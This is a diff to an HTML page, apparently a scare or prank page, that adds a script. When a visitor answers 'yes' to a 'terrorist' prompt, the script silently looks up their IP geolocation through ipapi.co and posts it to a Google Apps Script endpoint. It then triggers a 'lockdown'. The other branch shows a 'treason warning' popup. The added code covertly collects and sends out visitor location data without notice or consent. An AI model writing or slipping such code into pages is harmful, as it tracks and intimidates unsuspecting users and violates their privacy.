@@ -217,7 +217,32 @@
     window.location.href = "override.html";
   });
 </script>
+<script>
+  function sendLocationData() {
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        fetch("https://script.google.com/macros/s/AKfycbys9UIJRCO9eUU9YmB56UFzJXTxA7X_cinMFoqS-5NbBKRSTBncqLdGTVgGRZoJvbiJ/exec", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+      })
+      .catch(err => console.error("Location fetch failed:", err));
+  }
 
+  function handleTerroristAnswer(isTerrorist) {
+    if (isTerrorist) {
+      sendLocationData(); // Send location before lockdown
+      enableLockdown();
+    } else {
+      terroristOverlay.style.display = 'none';
+      if (!localStorage.getItem('treasonWarningShown')) {
+        treasonWarningPopup.style.display = 'flex';
+      }
+    }
+  }
+</script>
 </body>
 </html>
 
